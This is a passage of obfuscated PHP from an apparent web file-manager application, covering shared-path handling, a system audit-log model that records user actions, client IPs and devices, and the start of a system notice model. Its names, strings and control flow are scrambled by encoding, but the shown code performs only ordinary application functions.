$_SERVER[¢à]; if (strstr($F£ĞµÓãç, $F—®¨Â‘÷»[8]) === !1) { return array($F—®¨Â‘÷»[382] => intval($F£ĞµÓãç), $F—®¨Â‘÷»[75] => $F—®¨Â‘÷»[33], $F—®¨Â‘÷»[1107] => array()); } $CšÙ ¾°¹‘ = explode($F—®¨Â‘÷»[8], trim($F£ĞµÓãç, $F—®¨Â‘÷»[8])); if (count($CšÙ ¾°¹‘) < 2) { show_tips($F£ĞµÓãç . $F—®¨Â‘÷»[1111]); } return array($F—®¨Â‘÷»[382] => intval($CšÙ ¾°¹‘[0]), $F—®¨Â‘÷»[75] => $CšÙ ¾°¹‘[1], $F—®¨Â‘÷»[1107] => array_slice($CšÙ ¾°¹‘, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($e´®Ö“ÆÜ½) { $this->pathParse = $e´®Ö“ÆÜ½; $this->model = Model($_SERVER[¢à][1106]); } public function getPathOuter($bí´ÛÎµØ¹) { $DñïÍÌ„ë† =& $_SERVER[¢à]; if (!$bí´ÛÎµØ¹) { return $bí´ÛÎµØ¹; } $fãœ¶áÒó± = $this->parse($bí´ÛÎµØ¹); return trim(KodIO::makeShare($this->pathParse[$DñïÍÌ„ë†[364]], $fãœ¶áÒó±[$DñïÍÌ„ë†[364]]), $DñïÍÌ„ë†[8]); } protected function infoParse($E‹§Ü·ÓŒ, $FÕ†øì¡¡ï = false, $bÓÇë³ª•Ø = false) { $FçìÏù¾ˆö =& $_SERVER[¢à]; $f“Ãä´ ¥ = $this->pathParse[$FçìÏù¾ˆö[364]]; $cÄ¥…¬¿Ã = trim($this->pathParse[$FçìÏù¾ˆö[1007]], $FçìÏù¾ˆö[8]); return Action($FçìÏù¾ˆö[1112])->sharePathInfo($f“Ãä´ ¥, $cÄ¥…¬¿Ã); } public function infoFull($cá„’ÎäˆĞ) { $a–Ñø´İ =& $_SERVER[¢à]; $bĞî¹¨Ş±æ = explode($a–Ñø´İ[8], trim($cá„’ÎäˆĞ, $a–Ñø´İ[8])); if (count($bĞî¹¨Ş±æ) > 1) { $c¶ßì·“ƒ = implode($a–Ñø´İ[8], array_splice($bĞî¹¨Ş±æ, 1)); $f ¾¡×öä¢ = $this->model->pathInfoByPath($bĞî¹¨Ş±æ[0], $c¶ßì·“ƒ); if (!$f ¾¡×öä¢) { return !1; } $this->pathParse[$a–Ñø´İ[1007]] = $f ¾¡×öä¢[$a–Ñø´İ[366]]; } return $this->infoParse($cá„’ÎäˆĞ); } public function listAll($b¥ƒ¹Ôø‚Å) { goto A…â¾ø¡Ò‡; AËôØ‚±±: foreach ($CÔ¾Õ”µ°ã as &$CÈÎ½¾…§) { check_abort(); $CÈÎ½¾…§[$DôÇ®Š™­[388]] = $EŠØ¦µé˜“->_shareItemeParse($CÈÎ½¾…§[$DôÇ®Š™­[388]], $EµÖ¸Š˜—); } return $CÔ¾Õ”µ°ã; goto Eİ¬Š‚‰¨¡; c­×°ßôùå: $CÔ¾Õ”µ°ã = $this->model->listAll($b¥ƒ¹Ôø‚Å); $EµÖ¸Š˜— = Model($DôÇ®Š™­[532])->getInfo($eàãÉ—õÙ[$DôÇ®Š™­[437]]); $EŠØ¦µé˜“ = Action($DôÇ®Š™­[1112]); goto AËôØ‚±±; A…â¾ø¡Ò‡: $DôÇ®Š™­ =& $_SERVER[¢à]; $eàãÉ—õÙ = IO::info($this->pathParse[$DôÇ®Š™­[75]]); if (!$eàãÉ—õÙ) { return array(); } goto c­×°ßôùå; Eİ¬Š‚‰¨¡: } } goto C°Çœ­; B®äÄğÂ Š: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\155\137\x6c\157\x67"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\x54\151\x6d\145", "\x74\x69\155\x65", "\x69\156\163\145\162\164", "\146\165\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $C‘„„œƒñá =& $_SERVER[¢à]; return array($C‘„„œƒñá[2340] => LNG($C‘„„œƒñá[2341]), $C‘„„œƒñá[2342] => LNG($C‘„„œƒñá[2343]), $C‘„„œƒñá[2015] => LNG($C‘„„œƒñá[2344]), $C‘„„œƒñá[2345] => LNG($C‘„„œƒñá[2346]), $C‘„„œƒñá[2347] => LNG($C‘„„œƒñá[2348]), $C‘„„œƒñá[2349] => LNG($C‘„„œƒñá[2350]), $C‘„„œƒñá[2351] => LNG($C‘„„œƒñá[2352]), $C‘„„œƒñá[2353] => LNG($C‘„„œƒñá[2354]), $C‘„„œƒñá[2046] => LNG($C‘„„œƒñá[2355]), $C‘„„œƒñá[2047] => LNG($C‘„„œƒñá[2356]), $C‘„„œƒñá[2357] => LNG($C‘„„œƒñá[2358]), $C‘„„œƒñá[2359] => LNG($C‘„„œƒñá[2360]), $C‘„„œƒñá[2361] => LNG($C‘„„œƒñá[2362]), $C‘„„œƒñá[2363] => LNG($C‘„„œƒñá[2364]), $C‘„„œƒñá[2044] => LNG($C‘„„œƒñá[2365]), $C‘„„œƒñá[2050] => LNG($C‘„„œƒñá[2366]), $C‘„„œƒñá[2367] => LNG($C‘„„œƒñá[2368]), $C‘„„œƒñá[2369] => LNG($C‘„„œƒñá[2370]), $C‘„„œƒñá[2371] => LNG($C‘„„œƒñá[2372]), $C‘„„œƒñá[2373] => LNG($C‘„„œƒñá[2374]), $C‘„„œƒñá[2053] => LNG($C‘„„œƒñá[2375]), $C‘„„œƒñá[2054] => LNG($C‘„„œƒñá[2376]), $C‘„„œƒñá[2377] => LNG($C‘„„œƒñá[2378]), $C‘„„œƒñá[2379] => LNG($C‘„„œƒñá[2380]), $C‘„„œƒñá[2381] => LNG($C‘„„œƒñá[2382]), $C‘„„œƒñá[2383] => LNG($C‘„„œƒñá[2384]), $C‘„„œƒñá[2385] => LNG($C‘„„œƒñá[2386]), $C‘„„œƒñá[2048] => LNG($C‘„„œƒñá[2387]), $C‘„„œƒñá[2388] => LNG($C‘„„œƒñá[2389]), $C‘„„œƒñá[2390] => LNG($C‘„„œƒñá[2391]), $C‘„„œƒñá[2392] => LNG($C‘„„œƒñá[2392]), $C‘„„œƒñá[2393] => LNG($C‘„„œƒñá[2019]), $C‘„„œƒñá[2394] => LNG($C‘„„œƒñá[2395]), $C‘„„œƒñá[2396] => LNG($C‘„„œƒñá[2397]), $C‘„„œƒñá[2398] => LNG($C‘„„œƒñá[2399]), $C‘„„œƒñá[2400] => LNG($C‘„„œƒñá[2401]), $C‘„„œƒñá[2402] => LNG($C‘„„œƒñá[2402]), $C‘„„œƒñá[2403] => LNG($C‘„„œƒñá[2404]), $C‘„„œƒñá[2405] => LNG($C‘„„œƒñá[2406]), $C‘„„œƒñá[2407] => LNG($C‘„„œƒñá[2408]), $C‘„„œƒñá[2409] => LNG($C‘„„œƒñá[2410]), $C‘„„œƒñá[2411] => LNG($C‘„„œƒñá[2412]), $C‘„„œƒñá[2413] => LNG($C‘„„œƒñá[2414])); } private function typeFile() { $f‚öºÃ‡¦§ =& $_SERVER[¢à]; $CºÓ†¤±Áì = array($f‚öºÃ‡¦§[2050] => array($f‚öºÃ‡¦§[2051]), $f‚öºÃ‡¦§[2361] => array($f‚öºÃ‡¦§[2415]), $f‚öºÃ‡¦§[2363] => array($f‚öºÃ‡¦§[2416]), $f‚öºÃ‡¦§[2044] => array($f‚öºÃ‡¦§[2045]), $f‚öºÃ‡¦§[2369] => array(), $f‚öºÃ‡¦§[2371] => array(), $f‚öºÃ‡¦§[2373] => array(), $f‚öºÃ‡¦§[2053] => array($f‚öºÃ‡¦§[2055]), $f‚öºÃ‡¦§[2054] => array($f‚öºÃ‡¦§[2055]), $f‚öºÃ‡¦§[2377] => array($f‚öºÃ‡¦§[2417]), $f‚öºÃ‡¦§[2379] => array($f‚öºÃ‡¦§[2417]), $f‚öºÃ‡¦§[2381] => array($f‚öºÃ‡¦§[2418]), $f‚öºÃ‡¦§[2367] => array($f‚öºÃ‡¦§[2419]), $f‚öºÃ‡¦§[2383] => array($f‚öºÃ‡¦§[2420]), $f‚öºÃ‡¦§[2385] => array($f‚öºÃ‡¦§[2421]), $f‚öºÃ‡¦§[2048] => array($f‚öºÃ‡¦§[2049])); return $CºÓ†¤±Áì; } private function typeAll() { goto f‘·Ñ‹¦·; FÌŠˆ…¬Š: return $Eá™ËöñÃô; goto Cì¡‡‚×ë‘; f‘·Ñ‹¦·: $aÁâÒìÏ®É =& $_SERVER[¢à]; $Eá™ËöñÃô = $this->typeList; $f—¥ïß¤É¹ = array_filter($this->typeFile()); goto aµ¶œ˜®Ú¶; aµ¶œ˜®Ú¶: foreach ($f—¥ïß¤É¹ as $B×¡’ª•ô => $d©ñ¢„ó Å) { $Eá™ËöñÃô[$d©ñ¢„ó Å[0]] = $Eá™ËöñÃô[$B×¡’ª•ô]; } $Eá™ËöñÃô[$aÁâÒìÏ®É[2055]] = LNG($aÁâÒìÏ®É[2422]); $Eá™ËöñÃô[$aÁâÒìÏ®É[2417]] = LNG($aÁâÒìÏ®É[2423]); goto FÌŠˆ…¬Š; Cì¡‡‚×ë‘: } public function addLog($FàÖÍ“†–Å, $cÁç¶‚¤äŞ = array()) { goto Dä‰˜˜­ÁÃ; C½ƒš‘åÌæ: parent::add($cÁç¶‚¤äŞ); goto cåÅƒƒçÉâ; c»Ùäª¾Ä: $c¾°›Å‹»× = get_client_ip(); if (!$cÁç¶‚¤äŞ || strlen(json_encode($cÁç¶‚¤äŞ)) >= 1024) { $cÁç¶‚¤äŞ = array($E¯¤İùÜœô[2424] => $c¾°›Å‹»×); } else { if (is_array($cÁç¶‚¤äŞ)) { $cÁç¶‚¤äŞ[$E¯¤İùÜœô[2424]] = $c¾°›Å‹»×; } else { $cÁç¶‚¤äŞ = array($E¯¤İùÜœô[1030] => $cÁç¶‚¤äŞ, $E¯¤İùÜœô[2424] => $c¾°›Å‹»×); } } $cÁç¶‚¤äŞ = array($E¯¤İùÜœô[1402] => Session::sign(), $E¯¤İùÜœô[1403] => $bÊÓòôõì‚, $E¯¤İùÜœô[29] => $FàÖÍ“†–Å, $E¯¤İùÜœô[1405] => json_encode($cÁç¶‚¤äŞ)); goto C½ƒš‘åÌæ; Dä‰˜˜­ÁÃ: $E¯¤İùÜœô =& $_SERVER[¢à]; if (!isset($this->typeList[$FàÖÍ“†–Å])) { return; } $bÊÓòôõì‚ = USER_ID ? USER_ID : (isset($cÁç¶‚¤äŞ[$E¯¤İùÜœô[1412]]) ? $cÁç¶‚¤äŞ[$E¯¤İùÜœô[1412]] : 0); goto c»Ùäª¾Ä; cåÅƒƒçÉâ: } public function remove($cæ‹Ìï) { $this->where(array($_SERVER[¢à][382] => $cæ‹Ìï))->delete(); } private function _makeOrder($DÌé¡²»• = '') { goto BÑÆ÷ƒ¼Ì˜; FµÎ—ÓÎ§ƒ: return $this->order($DÌé¡²»•); goto CÓ†É‘µ¦; CŸ°ˆ¤× Î: $eàÁ•æ–Ş = Input::get($Cøƒ°½¬ÒË[404], $Cøƒ°½¬ÒË[7], $Cøƒ°½¬ÒË[2213], array($Cøƒ°½¬ÒË[2150], $Cøƒ°½¬ÒË[400])); $eàÁ•æ–Ş = $dÍÅ§¨±ç[$eàÁ•æ–Ş]; $DÌé¡²»• = $DÌé¡²»• . "{$AˆÖ¥æ¤éì}\40{$eàÁ•æ–Ş}"; goto FµÎ—ÓÎ§ƒ; BÑÆ÷ƒ¼Ì˜: $Cøƒ°½¬ÒË =& $_SERVER[¢à]; $AˆÖ¥æ¤éì = $Cøƒ°½¬ÒË[184]; $dÍÅ§¨±ç = array($Cøƒ°½¬ÒË[398] => $Cøƒ°½¬ÒË[399], $Cøƒ°½¬ÒË[400] => $Cøƒ°½¬ÒË[401]); goto CŸ°ˆ¤× Î; CÓ†É‘µ¦: } public function get($c˜œŒ¨½‹Ó = '') { goto CéĞ¶çÏ®ã; B’Öæğ×°‹: $F¤˜§³ù×“[$b«…‰åÃ»[351]] = $this->logList($F¤˜§³ù×“[$b«…‰åÃ»[351]]); return $F¤˜§³ù×“; goto c¢¯•™®Œ; d¬å§²Ù¿±: if ($c˜œŒ¨½‹Ó[$b«…‰åÃ»[1412]]) { $DïË›†ÁÎÂ[$b«…‰åÃ»[1412]] = $c˜œŒ¨½‹Ó[$b«…‰åÃ»[1412]]; } if (isset($c˜œŒ¨½‹Ó[$b«…‰åÃ»[702]])) { $CÈáò•Ü‘ = $c˜œŒ¨½‹Ó[$b«…‰åÃ»[702]]; $Fù¹é¾ÎÆ¾ = isset($c˜œŒ¨½‹Ó[$b«…‰åÃ»[703]]) ? $c˜œŒ¨½‹Ó[$b«…‰åÃ»[703]] : time(); $DïË›†ÁÎÂ[$b«…‰åÃ»[184]] = array($b«…‰åÃ»[318], array($CÈáò•Ü‘, $Fù¹é¾ÎÆ¾)); } if ($c˜œŒ¨½‹Ó[$b«…‰åÃ»[29]]) { $a¹¼°é—¾Ö = explode($b«…‰åÃ»[47], $c˜œŒ¨½‹Ó[$b«…‰åÃ»[29]]); $EŠ®îë„–® = $this->typeFile(); $aµâÔ½Ö‹µ = array(); foreach ($a¹¼°é—¾Ö as $AÂ÷Û¢Š–Ë) { $aµâÔ½Ö‹µ[] = $AÂ÷Û¢Š–Ë; if (isset($EŠ®îë„–®[$AÂ÷Û¢Š–Ë])) { $aµâÔ½Ö‹µ = array_merge($aµâÔ½Ö‹µ, $EŠ®îë„–®[$AÂ÷Û¢Š–Ë]); } } $aµâÔ½Ö‹µ = array_unique($aµâÔ½Ö‹µ); if ($aµâÔ½Ö‹µ) { $DïË›†ÁÎÂ[$b«…‰åÃ»[29]] = array($b«…‰åÃ»[7], $aµâÔ½Ö‹µ); } } goto BÌ¡…öÇö‹; CéĞ¶çÏ®ã: $b«…‰åÃ» =& $_SERVER[¢à]; if (!$c˜œŒ¨½‹Ó) { show_json(array()); } $DïË›†ÁÎÂ = array(); goto d¬å§²Ù¿±; BÌ¡…öÇö‹: if (!empty($c˜œŒ¨½‹Ó[$b«…‰åÃ»[2424]])) { $DïË›†ÁÎÂ[$b«…‰åÃ»[401]] = array($b«…‰åÃ»[751], "\x25{$c˜œŒ¨½‹Ó[$b«…‰åÃ»[2424]]}\x25"); } $F¤˜§³ù×“ = $this->_makeOrder()->where($DïË›†ÁÎÂ)->selectPage(); if (empty($F¤˜§³ù×“[$b«…‰åÃ»[351]])) { show_json(array(), !0, $F¤˜§³ù×“[$b«…‰åÃ»[348]]); } goto B’Öæğ×°‹; c¢¯•™®Œ: } private function ipAddress(&$c¡Ş°©£ã) { $F§µùÙ·™ =& $_SERVER[¢à]; if (!empty($c¡Ş°©£ã[$F§µùÙ·™[2424]])) { $bï¸Õò§ ç = IpLocation::get($c¡Ş°©£ã[$F§µùÙ·™[2424]]); if ($bï¸Õò§ ç == $F§µùÙ·™[2425]) { $bï¸Õò§ ç = $F§µùÙ·™[2426]; } } else { $bï¸Õò§ ç = LNG($F§µùÙ·™[2427]); } $c¡Ş°©£ã[$F§µùÙ·™[2428]] = $bï¸Õò§ ç; } private function descZipDownload($AÛ»©ˆè¦, &$Eà¥õˆÈ»…) { $F­ëöãêÙè =& $_SERVER[¢à]; if (!isset($AÛ»©ˆè¦[$F­ëöãêÙè[2429]])) { return; } $EÒ©ë­öî = json_decode($AÛ»©ˆè¦[$F­ëöãêÙè[2429]], !0); foreach ($EÒ©ë­öî as $EÒø‰¹ã¶ ) { if (!IO::init($EÒø‰¹ã¶ [$F­ëöãêÙè[75]])) { continue; } if (!($a›­¼ÇºÌŒ = IO::infoFull($EÒø‰¹ã¶ [$F­ëöãêÙè[75]]))) { continue; } $AÛ»©ˆè¦[$F­ëöãêÙè[75]] = $EÒø‰¹ã¶ [$F­ëöãêÙè[75]]; $Eà¥õˆÈ»…[] = $AÛ»©ˆè¦[$F­ëöãêÙè[2246]] = $a›­¼ÇºÌŒ[$F­ëöãêÙè[457]]; break; } return $AÛ»©ˆè¦; } private function getSourceList(&$e¬Ô¬ÚĞª) { $cÃìÎïÊ³ =& $_SERVER[¢à]; $d¿‰Ş‚Á©Ì = array(); foreach ($e¬Ô¬ÚĞª as $aÆ’À·»© => $Bñ£¢„ÂºÄ) { goto CöÕƒÉË²Ó; d£É©¸Ç”¨: $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[366]]; $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[2246]]; if ($CÊ§Ş…Ëœí[$cÃìÎïÊ³[29]] == $cÃìÎïÊ³[488]) { $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[401]][$cÃìÎïÊ³[1002]]; $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[401]][$cÃìÎïÊ³[1003]]; } goto Cåâ›²àêì; Cåâ›²àêì: if ($CÊ§Ş…Ëœí[$cÃìÎïÊ³[29]] == $cÃìÎïÊ³[2254]) { $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[401]][$cÃìÎïÊ³[366]]; } goto f˜æª‡“‚; CöÕƒÉË²Ó: $CÊ§Ş…Ëœí = json_decode($Bñ£¢„ÂºÄ[$cÃìÎïÊ³[401]], !0); if ($Bñ£¢„ÂºÄ[$cÃìÎïÊ³[29]] == $cÃìÎïÊ³[2047]) { $CÊ§Ş…Ëœí = $this->descZipDownload($CÊ§Ş…Ëœí, $d¿‰Ş‚Á©Ì); $e¬Ô¬ÚĞª[$aÆ’À·»©][$cÃìÎïÊ³[401]] = json_encode($CÊ§Ş…Ëœí); continue; } if (strpos($Bñ£¢„ÂºÄ[$cÃìÎïÊ³[29]], $cÃìÎïÊ³[2247]) !== 0) { goto d´ÌïÊÕÎÈ; CÄ†Ğ…œ: continue; goto bÇò²å¯è‘; A „À×è’¾: $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[366]] = $c××öôÈïŠ[$cÃìÎïÊ³[366]]; $d¿‰Ş‚Á©Ì[] = $CÊ§Ş…Ëœí[$cÃìÎïÊ³[2246]] = $c××öôÈïŠ[$cÃìÎïÊ³[457]]; $e¬Ô¬ÚĞª[$aÆ’À·»©][$cÃìÎïÊ³[401]] = json_encode($CÊ§Ş…Ëœí); goto CÄ†Ğ…œ; d´ÌïÊÕÎÈ: if (!isset($CÊ§Ş…Ëœí[$cÃìÎïÊ³[75]]) || strpos($Bñ£¢„ÂºÄ[$cÃìÎïÊ³[29]], $cÃìÎïÊ³[2430]) !== 0) { continue; } if (!IO::init($CÊ§Ş…Ëœí[$cÃìÎïÊ³[75]])) { continue; } if (!($c××öôÈïŠ = IO::infoFull($CÊ§Ş…Ëœí[$cÃìÎïÊ³[75]]))) { continue; } goto A „À×è’¾; bÇò²å¯è‘: } goto d£É©¸Ç”¨; f˜æª‡“‚: } if (!$d¿‰Ş‚Á©Ì) { return array(); } return Model($cÃìÎïÊ³[752])->sourceListInfo($d¿‰Ş‚Á©Ì, !0); } private function logList($eËƒ¢ìÖ×‚) { goto b¡‡µù£ôÓ; e’ôí¹Š: $cÍ‚ëˆİé = $this->getSourceList($eËƒ¢ìÖ×‚); $c“—‚øËŒ¦ = $this->typeAll(); $b’Ó¡ÔÖ›½ = array(); goto fòçßÂ‡; b¡‡µù£ôÓ: $A…ÕàíÈè« =& $_SERVER[¢à]; $Dìé®•Ó¥ô = array_to_keyvalue($eËƒ¢ìÖ×‚, $A…ÕàíÈè«[33], $A…ÕàíÈè«[1412]); $fçÃƒëÀêÏ = Model($A…ÕàíÈè«[473])->userListInfo(array_unique($Dìé®•Ó¥ô)); goto e’ôí¹Š; e¸ãôØñÇ: return $b’Ó¡ÔÖ›½; goto díÑğöÛ¹«; fòçßÂ‡: $dÊâ¡¸‰È‚ = array(); foreach ($eËƒ¢ìÖ×‚ as $A”¶˜Ööœñ => $A²ÜÚ ®©¥) { goto F¾´…èŸ±…; DˆÉÌˆÌ…Ô: unset($A²ÜÚ ®©¥[$A…ÕàíÈè«[2433]]); $b’Ó¡ÔÖ›½[] = $A²ÜÚ ®©¥; goto eËù—‚’; e¯šŠ‹…Ü“: $A²ÜÚ ®©¥[$A…ÕàíÈè«[2212]] = $fâñïòƒÍ«; $c§à½Å±Æ… = json_decode($A²ÜÚ ®©¥[$A…ÕàíÈè«[401]], !0); $A²ÜÚ ®©¥[$A…ÕàíÈè«[2424]] = isset($c§à½Å±Æ…[$A…ÕàíÈè«[2424]]) ? $c§à½Å±Æ…[$A…ÕàíÈè«[2424]] : $A…ÕàíÈè«[33]; goto bæºù´¨Æ; F¾´…èŸ±…: $DßÕİö·åß = $A²ÜÚ ®©¥[$A…ÕàíÈè«[29]]; $fâñïòƒÍ« = isset($fçÃƒëÀêÏ[$A²ÜÚ ®©¥[$A…ÕàíÈè«[1412]]]) ? $fçÃƒëÀêÏ[$A²ÜÚ ®©¥[$A…ÕàíÈè«[1412]]] : !1; $Bä‹Æõâ®£ = strpos($DßÕİö·åß, $A…ÕàíÈè«[2431]) == 0 ? LNG($A…ÕàíÈè«[2432]) : LNG($A…ÕàíÈè«[2427]); goto aöá‹ÙÓ; aöá‹ÙÓ: $A²ÜÚ ®©¥[$A…ÕàíÈè«[28]] = isset($fâñïòƒÍ«[$A…ÕàíÈè«[28]]) ? $fâñïòƒÍ«[$A…ÕàíÈè«[28]] : LNG($A…ÕàíÈè«[2427]); $A²ÜÚ ®©¥[$A…ÕàíÈè«[2295]] = isset($fâñïòƒÍ«[$A…ÕàíÈè«[2295]]) ? $fâñïòƒÍ«[$A…ÕàíÈè«[2295]] : $A…ÕàíÈè«[33]; $A²ÜÚ ®©¥[$A…ÕàíÈè«[1317]] = isset($c“—‚øËŒ¦[$DßÕİö·åß]) ? $c“—‚øËŒ¦[$DßÕİö·åß] : $Bä‹Æõâ®£; goto e¯šŠ‹…Ü“; bæºù´¨Æ: $this->ipAddress($A²ÜÚ ®©¥); if (strpos($DßÕİö·åß, $A…ÕàíÈè«[2247]) === 0 || isset($c§à½Å±Æ…[$A…ÕàíÈè«[2246]])) { goto FÉ¸Äğ«ÀÛ; CÏÁÀäİíÚ: if ($c§à½Å±Æ…[$A…ÕàíÈè«[29]] == $A…ÕàíÈè«[2254]) { $c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[366]] = $cÍ‚ëˆİé[$c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[366]]]; } if ($c§à½Å±Æ…[$A…ÕàíÈè«[29]] == $A…ÕàíÈè«[2042]) { $c§à½Å±Æ…[$A…ÕàíÈè«[2259]] = $c§à½Å±Æ…[$A…ÕàíÈè«[388]]; $c§à½Å±Æ…[$A…ÕàíÈè«[2246]] = $c§à½Å±Æ…[$A…ÕàíÈè«[2259]][$A…ÕàíÈè«[366]]; $c§à½Å±Æ…[$A…ÕàíÈè«[388]] = !1; $c§à½Å±Æ…[$A…ÕàíÈè«[366]] = $A…ÕàíÈè«[33]; } if ($c§à½Å±Æ…[$A…ÕàíÈè«[388]] && $c§à½Å±Æ…[$A…ÕàíÈè«[388]][$A…ÕàíÈè«[368]] == $A…ÕàíÈè«[1076]) { $dÊâ¡¸‰È‚[] = $A²ÜÚ ®©¥[$A…ÕàíÈè«[364]]; unset($eËƒ¢ìÖ×‚[$A”¶˜Ööœñ]); continue; } goto aÓÊÍï¾—; aÓÊÍï¾—: if ($c§à½Å±Æ…[$A…ÕàíÈè«[2259]] && $c§à½Å±Æ…[$A…ÕàíÈè«[2259]][$A…ÕàíÈè«[368]] == $A…ÕàíÈè«[1076]) { $dÊâ¡¸‰È‚[] = $A²ÜÚ ®©¥[$A…ÕàíÈè«[364]]; unset($eËƒ¢ìÖ×‚[$A”¶˜Ööœñ]); continue; } goto fì£ò®ß‹; FÉ¸Äğ«ÀÛ: $c§à½Å±Æ…[$A…ÕàíÈè«[388]] = $cÍ‚ëˆİé[$c§à½Å±Æ…[$A…ÕàíÈè«[366]]]; $c§à½Å±Æ…[$A…ÕàíÈè«[2259]] = $cÍ‚ëˆİé[$c§à½Å±Æ…[$A…ÕàíÈè«[2246]]]; if ($c§à½Å±Æ…[$A…ÕàíÈè«[29]] == $A…ÕàíÈè«[488]) { $c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[1002]] = $cÍ‚ëˆİé[$c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[1002]]]; $c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[1003]] = $cÍ‚ëˆİé[$c§à½Å±Æ…[$A…ÕàíÈè«[401]][$A…ÕàíÈè«[1003]]]; } goto CÏÁÀäİíÚ; fì£ò®ß‹: } $A²ÜÚ ®©¥[$A…ÕàíÈè«[401]] = $c§à½Å±Æ…; goto DˆÉÌˆÌ…Ô; eËù—‚’: } $this->clearSystemPathLog($dÊâ¡¸‰È‚); goto e¸ãôØñÇ; díÑğöÛ¹«: } private function clearSystemPathLog($BŠºèºùÓ) { $aç…¿ôÎ‰° =& $_SERVER[¢à]; if (count($BŠºèºùÓ) == 0) { return; } $cåø¼éÈëˆ = array($aç…¿ôÎ‰°[364] => array($aç…¿ôÎ‰°[7], array_unique($BŠºèºùÓ))); $this->where($cåø¼éÈëˆ)->delete(); } public function deviceList($f¬×§©ùïÈ, $c»ö¥æŸ¸ = 0) { $f‡Îƒà†•Š =& $_SERVER[¢à]; $b—ÂØ´”†² = array($f‡Îƒà†•Š[1412] => $f¬×§©ùïÈ, $f‡Îƒà†•Š[184] => array($f‡Îƒà†•Š[926], $c»ö¥æŸ¸), $f‡Îƒà†•Š[29] => $f‡Îƒà†•Š[2015]); $A½ˆ°ˆ©î = array(); $EÀÑáÙ®ä² = $this->field($f‡Îƒà†•Š[2434])->where($b—ÂØ´”†²)->order($f‡Îƒà†•Š[2257])->limit(50)->select(); foreach ($EÀÑáÙ®ä² as $EŠ¦Äå·ªÃ => $cŠ›Õİ’ö) { goto BÙï‚×‚‘; BÙï‚×‚‘: if ($EŠ¦Äå·ªÃ > 0 && abs($cŠ›Õİ’ö[$f‡Îƒà†•Š[184]] - $EÀÑáÙ®ä²[$EŠ¦Äå·ªÃ - 1][$f‡Îƒà†•Š[184]]) < 5) { continue; } $cÇ„’ ¹ = json_decode($cŠ›Õİ’ö[$f‡Îƒà†•Š[401]], !0); $cŠ›Õİ’ö[$f‡Îƒà†•Š[2424]] = isset($cÇ„’ ¹[$f‡Îƒà†•Š[2424]]) ? $cÇ„’ ¹[$f‡Îƒà†•Š[2424]] : $f‡Îƒà†•Š[33]; goto dÚŞ¸Äµ¼; dÚŞ¸Äµ¼: unset($cÇ„’ ¹[$f‡Îƒà†•Š[2424]]); $Eø¥ƒé¦Á• = $this->deviceType($cÇ„’ ¹[$f‡Îƒà†•Š[2248]]); if (isset($A½ˆ°ˆ©î[$Eø¥ƒé¦Á•])) { continue; } goto d…£°Û‡÷ô; d…£°Û‡÷ô: $this->ipAddress($cŠ›Õİ’ö); $cŠ›Õİ’ö[$f‡Îƒà†•Š[401]] = $cÇ„’ ¹; $A½ˆ°ˆ©î[$Eø¥ƒé¦Á•] = $cŠ›Õİ’ö; goto C’Í¨¹¨Š¬; C’Í¨¹¨Š¬: } return array_values($A½ˆ°ˆ©î); } public function deviceType($F÷–¬ÃÅƒ‘) { return $F÷–¬ÃÅƒ‘; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\156\157\164\x69\x63\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\143\x6f\x6e\x74\x65\156\x74", "\x61\x75\164\x68", "\155\157\144\145", "\164\151\x6d\x65", "\x74\171\x70\145", "\154\145\166\x65\x6c", "\x65\156\x61\142\154\x65", "\x73\x6f\162\x74"); public function listData($EÒÛŒØ¼¹ = false, $fÉòğ•Âµ = "\x73\157\x72\x74", $Eô«Ã‚šß» = false) { return parent::listData($EÒÛŒØ¼¹, $fÉòğ•Âµ, $Eô«Ã‚šß»); } public function add($böÏ½áÎºå) { goto C°³Ôã™Ş; FõÄ›ˆ•øù: $c—èç­Ö Å = time(); if ($böÏ½áÎºå[$C†ÚÅİôÒÛ[12]] == $C†ÚÅİôÒÛ[2435]) { $c—èç­Ö Å = strtotime($böÏ½áÎºå[$C†ÚÅİôÒÛ[187]]); } $böÏ½áÎºå[$C†ÚÅİôÒÛ[187]] = $c—èç­Ö Å; goto dä—ñÅÂŠ; dä—ñÅÂŠ: return parent::insert($böÏ½áÎºå); goto Fâçœ±™à—; C°³Ôã™Ş: $C†ÚÅİôÒÛ =& $_SERVER[¢à]; $b‚‘ĞŠØè¼ = $this->findByName($böÏ½áÎºå[$C†ÚÅİôÒÛ[28]]); if ($b‚‘ĞŠØè¼) { return !1; } goto FõÄ›ˆ•øù; Fâçœ±™à—: } public function update($EØ÷—’—®ò, $fºˆî–ãò) { goto bâƒ®¯ëµù; cİòäìÇ•: if (!$c¦÷Û³éó² || $dâöĞ¿¬Ë && $dâöĞ¿¬Ë[$e‡™ƒí…[364]] != $c¦÷Û³éó²[$e‡™ƒí…[364]]) { return !1; } $C»ô‹á¯‹ = time(); if ($fºˆî–ãò[$e‡™ƒí…[12]] == $e‡™ƒí…[2435]) { $C»ô‹á¯‹ = strtotime($fºˆî–ãò[$e‡™ƒí…[187]]); } goto dµÌÚÉ°Œ¼; bâƒ®¯ëµù: $e‡™ƒí… =& $_SERVER[¢à]; $c¦÷Û³éó² = $this->listData($EØ÷—’—®ò); $dâöĞ¿¬Ë = $this->findByName($fºˆî–ãò[$e‡™ƒí…[28]]); goto 